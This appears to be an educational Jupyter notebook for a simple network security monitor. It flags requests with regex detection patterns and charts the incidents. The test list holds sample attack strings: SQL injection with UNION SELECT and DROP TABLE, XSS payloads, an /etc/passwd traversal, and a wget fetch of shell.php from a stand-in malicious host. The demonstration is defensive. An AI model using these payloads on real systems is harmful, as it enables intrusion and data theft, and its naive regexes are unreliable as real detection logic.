# Network Security Monitor

> **Authorized lab use only.** This notebook is an educational demonstration. Run it only with synthetic data or systems you own and are permitted to test.


In [ ]:
import hashlib
import re
import json
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
from datetime import datetime
from collections import defaultdict
from IPython.display import display, HTML

class SecurityMonitor:
    def __init__(self):
        self.threat_db = defaultdict(int)
        self.suspicious_ips = set()
        self.blocked_patterns = [
            r'(\d+\.){3}\d+.*?(SELECT|UNION|DROP|INSERT)',
            r'<script.*?>.*?</script>',
            r'\.\.\/.*?etc\/passwd',
            r'(wget|curl).*?(http|ftp):\/\/',
        ]

    def hash_data(self, data):
        return hashlib.sha256(data.encode()).hexdigest()

    def analyze_request(self, request_data):
        threats = []
        risk_score = 0

        for pattern in self.blocked_patterns:
            if re.search(pattern, request_data, re.IGNORECASE):
                threat_type = self._identify_threat_type(pattern)
                threats.append(threat_type)
                risk_score += 25

        return {'threats': threats, 'risk_score': min(risk_score, 100)}

    def _identify_threat_type(self, pattern):
        threat_map = {
            0: 'SQL Injection',
            1: 'XSS Attack',
            2: 'Directory Traversal',
            3: 'Remote File Inclusion'
        }
        return threat_map.get(self.blocked_patterns.index(pattern), 'Unknown')

    def log_incident(self, ip, threat_data, request):
        incident = {
            'timestamp': datetime.now().isoformat(),
            'source_ip': ip,
            'threats': threat_data['threats'],
            'risk_score': threat_data['risk_score'],
            'request_hash': self.hash_data(request)
        }

        if threat_data['risk_score'] >= 50:
            self.suspicious_ips.add(ip)
            self.threat_db[ip] += 1

        return incident

    def visualize_threats(self):
        if not self.threat_db:
            print("No threats detected yet!")
            return

        threat_data = []
        for ip, count in self.threat_db.items():
            threat_data.append({'IP': ip, 'Incidents': count})

        df = pd.DataFrame(threat_data)

        html_table = df.to_html(classes='table table-striped', escape=False)
        display(HTML(f"<h3>🚨 Threat Summary</h3>{html_table}"))

        plt.figure(figsize=(10, 4))
        plt.subplot(1, 2, 1)
        plt.bar(df['IP'], df['Incidents'], color='red', alpha=0.7)
        plt.title('Incidents by IP')
        plt.xticks(rotation=45)

        plt.subplot(1, 2, 2)
        plt.pie([len(self.suspicious_ips), 100-len(self.suspicious_ips)],
                labels=['Blocked', 'Clean'], autopct='%1.1f%%', colors=['red', 'green'])
        plt.title('IP Status')
        plt.tight_layout()
        plt.show()

if __name__ == "__main__":
    try:
        import google.colab
        !pip install seaborn matplotlib pandas -q
    except ImportError:
        pass

    monitor = SecurityMonitor()
    incidents_log = []

    test_requests = [
        ("192.168.1.100", "GET /admin?id=1' UNION SELECT * FROM users--"),
        ("10.0.0.50", "<script>alert('XSS')</script>"),
        ("172.16.1.20", "GET /../../../etc/passwd"),
        ("203.0.113.10", "Normal request to /home"),
        ("192.168.1.100", "POST /login'; DROP TABLE users; --"),
        ("45.33.32.156", "wget http://malicious.com/shell.php"),
        ("10.0.0.50", "GET /search?q=<img src=x onerror=alert(1)>")
    ]

    print("🔒 NETWORK SECURITY MONITOR 🔒\n")

    for ip, request in test_requests:
        analysis = monitor.analyze_request(request)
        if analysis['threats']:
            incident = monitor.log_incident(ip, analysis, request)
            incidents_log.append(incident)
            status = "🚨 BLOCKED"
            color = "red"
        else:
            status = "✅ ALLOWED"
            color = "green"

        print(f"{status} | {ip} | Risk: {analysis['risk_score']}% | {analysis['threats']}")

    print(f"\n📊 DASHBOARD SUMMARY")
    print(f"Total Requests: {len(test_requests)}")
    print(f"Blocked Requests: {len(incidents_log)}")
    print(f"Suspicious IPs: {len(monitor.suspicious_ips)}")

    monitor.visualize_threats()